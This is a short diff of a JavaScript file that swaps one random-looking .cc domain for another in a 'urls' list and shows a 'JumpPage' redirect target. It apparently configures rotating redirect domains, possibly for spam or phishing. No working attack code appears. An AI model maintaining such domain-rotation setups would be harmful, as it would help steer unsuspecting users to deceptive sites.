@@ -37,9 +37,9 @@ var emails = [
 ];
 
 var urls=[
+	'hmcotgis.cc',
 	'qqnvgmpyf.cc',
 	'82g34177y.cc',
-	'm256ed7n.cc',
 ];                                                                                                                  
 
 var JumpPage="https://uunldnge.cc";
